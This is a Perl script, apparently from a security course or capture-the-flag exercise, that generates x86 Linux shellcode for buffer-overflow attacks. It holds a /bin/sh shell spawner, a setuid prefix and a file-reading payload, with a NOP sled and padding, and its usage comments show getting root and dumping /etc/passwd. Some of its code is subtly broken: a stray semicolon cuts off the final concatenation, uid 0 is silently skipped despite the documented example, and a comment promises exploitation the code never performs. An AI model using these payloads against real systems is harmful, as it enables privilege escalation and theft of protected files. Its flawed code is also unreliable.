#!/usr/bin/perl
use Getopt::Long;
# A utility for crafting shellcode. Currently supports shell dropping, file
# reading, and setuid.
#
# Example, setuid to 107 and cat out /etc/passwd:
#   ./flavor_injector.pl -uid 107 -file /etc/passwd
#
# Example, setuid 0, and spawn a shell with a 1024 nop sled
#   ./flavor_injector.pl -uid 0 -nop 1024

################################################################################
# Command line arguments
################################################################################

# Stack starts at: 0xbfffd4ff
my $pre_args = "";
my $post_args = "";
my $nop_size = 0;
my $uid;
my $target_file;

GetOptions(
    "nop=i"     =>  \$nop_size
,   "pre=s"     =>  \$pre_args
,   "post=s"    =>  \$post_args
,   "uid=i"     =>  \$uid
,   "file=s"    =>  \$target_file
);

################################################################################
# Payloads
################################################################################

# Spawn a shell
my $payload =   "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            .   "\x89\xe3\xb0\x0b\xcd\x80";

sub setuid_payload {
    my ($user_id) = @_;

    # Grab the hex string of the user id
    my $hex_string = sprintf("%04x", $user_id);
    my $a = chr(hex(substr($hex_string, 0, 2)));
    my $b = chr(hex(substr($hex_string, 2, 2)));

    my $set_ebx = "\x31\xdb";
    $set_ebx .= "\xb3" . $b if ($user_id < 256);
    $set_ebx .= "\x66\xbb" . $b . $a if ($user_id >= 256);

    return "\x6A\x46\x58" . $set_ebx . "\x89\xD9\xCD\x80";
}

# Reads a file.
# Note: that this payload must be null terminated.
sub filereader_payload {
    my ($file_path) = @_;
    return  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
        .   "\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
        .   "\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
        .   "\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
        .   "\xff"
        .   $file_path
        .   "\x00";
}

################################################################################
# Helper methods
################################################################################

#Takes a hex string and formats it for injection.
sub make_hex {
    my ($address) = @_;

    $a = substr($address, 0, 2);
    $b = substr($address, 2, 2);
    $c = substr($address, 4, 2);
    $d = substr($address, 6, 2);

    return  chr(hex($d))
    .       chr(hex($c))
    .       chr(hex($b))
    .       chr(hex($a));
}

################################################################################
# Main
################################################################################

# If the user supplies a target file, switch payload from shell to file reader
if ($target_file) {
    $payload = filereader_payload($target_file);
}
# If the user supplies a uid, then prepend a setuid shell
if ($uid) {
    $payload = setuid_payload($uid) . $payload;
}

# Construct our payload
my $args    =   $pre_args
            .   "\x90"x($nop_size)
            .   $payload;
            .   $post_args;

# If we are given a path to the binary, attempt to directly exploit it.
# Otherwise print the arguments.
print $args;
